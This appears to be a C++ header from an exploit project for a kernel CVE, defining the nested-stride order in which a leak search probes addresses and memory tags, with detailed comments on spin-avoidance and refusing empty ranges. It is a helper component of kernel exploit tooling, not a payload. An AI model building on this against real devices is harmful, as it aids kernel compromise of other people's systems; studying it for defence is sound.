#pragma once
/** @file backend/cve_2026_43499/leak/leak_walk.hpp
 *  The order the leak search tries addresses in.
 *
 *  Three nested strides over a range that has already been aligned, and for every
 *  address three things to try in a fixed order: the canonical tag first, and then
 *  the sweep's tags. The nested bounds are the ones scan_bounds gives, so an inner
 *  walk stops at its outer walk's next step rather than at the range end -- which is
 *  what keeps a slab from spilling into the next coarse block.
 *
 *  Every walk must also move. A bound computed from a range that does not contain the
 *  step it is asked about comes back at or behind the current address, and a loop that
 *  takes such a step turns into a spin: it was found by injecting exactly that mistake
 *  and watching a test run to a hundred percent of a processor instead of failing. So a
 *  walk that cannot advance refuses, by name, rather than looping -- a hang is the one
 *  failure that hides from every assertion written afterwards.
 *
 *  Nothing here touches the kernel or decides anything: it produces a sequence for
 *  someone else to test against a bucket function. That is deliberate, because the
 *  sequence is where an off-by-one in the nesting would hide -- it would still find
 *  the object eventually, just after looking somewhere it should not have, and no
 *  device run would say which.
 */
#include <cstddef>
#include <cstdint>

#include "backend/cve_2026_43499/leak/candidate_match.hpp"
#include "backend/cve_2026_43499/leak/scan_bounds.hpp"
#include "backend/cve_2026_43499/leak/scan_geometry.hpp"

namespace ghostlock::backend::cve_2026_43499::leak {
    /** One address to test, with the tag to write into it. */
    struct LeakProbe final {
        std::uint64_t address = 0U;
        std::uint64_t tag = 0U;
    };

    /** What the walk reports to: called once per probe, in order. */
    template <class Sink>
    concept LeakProbeSink = requires(Sink &sink, const LeakProbe &probe) {
        { sink.on_probe(probe) } -> std::same_as<bool>;
    };

    /** How a walk ended. */
    enum class WalkVerdict : unsigned char {
        Ok = 0,
        /** The caller stopped it, by answering false to a probe. */
        Stopped = 1,
        /** The geometry could not be used, or a walk could not move. */
        GeometryMissing = 2,
    };

    [[nodiscard]] constexpr const char *walk_verdict_name(WalkVerdict verdict) noexcept {
        switch (verdict) {
            case WalkVerdict::Ok: return "ok";
            case WalkVerdict::Stopped: return "stopped";
            case WalkVerdict::GeometryMissing: return "geometry-missing";
        }
        return "unknown";
    }

    /** The next value of a walk, or zero when the step would not advance. */
    [[nodiscard]] constexpr bool walk_advances(std::uint64_t current, std::uint64_t next) noexcept {
        return next > current;
    }

    /** Walk the range, trying each address with the canonical tag and then with every
     *  sweep tag, stopping early when the sink says so. The sink sees the tag it should
     *  write, not the tagged address: writing it is the caller's, and the two must not
     *  drift apart. */
    template <LeakProbeSink Sink>
    [[nodiscard]] WalkVerdict walk_leak_candidates(const ScanStrides &strides, const ScanRange &range,
                                                   bool sweep_tags, Sink &sink) noexcept {
        if (!strides_are_usable(strides)) {
            return WalkVerdict::GeometryMissing;
        }
        /* An empty range is refused rather than walked empty. Reporting success after
         *  trying nothing reads, to whoever asked, exactly like having searched and found
         *  nothing -- and in a collision search those two must never look alike. */
        if (range.start >= range.end) {
            return WalkVerdict::GeometryMissing;
        }
        std::uint64_t coarse = range.start;
        while (coarse < range.end) {
            const std::uint64_t slab_end = scan_limit(coarse, strides.coarse, range.end);
            std::uint64_t slab = coarse;
            while (slab < slab_end) {
                const std::uint64_t candidate_end = scan_limit(slab, strides.slab, slab_end);
                std::uint64_t address = slab;
                while (address < candidate_end) {
                    if (!sink.on_probe(LeakProbe{address, kCanonicalTag})) {
                        return WalkVerdict::Stopped;
                    }
                    if (sweep_tags) {
                        for (std::size_t step = 0U; step < kTagSweepCount; ++step) {
                            if (!sink.on_probe(LeakProbe{address, sweep_tag(step)})) {
                                return WalkVerdict::Stopped;
                            }
                        }
                    }
                    const std::uint64_t next_address =
                        scan_limit(address, strides.candidate, candidate_end);
                    if (!walk_advances(address, next_address)) {
                        return WalkVerdict::GeometryMissing;
                    }
                    address = next_address;
                }
                const std::uint64_t next_slab = scan_limit(slab, strides.slab, slab_end);
                if (!walk_advances(slab, next_slab)) {
                    return WalkVerdict::GeometryMissing;
                }
                slab = next_slab;
            }
            const std::uint64_t next_coarse = scan_limit(coarse, strides.coarse, range.end);
            if (!walk_advances(coarse, next_coarse)) {
                return WalkVerdict::GeometryMissing;
            }
            coarse = next_coarse;
        }
        return WalkVerdict::Ok;
    }
}  // namespace ghostlock::backend::cve_2026_43499::leak
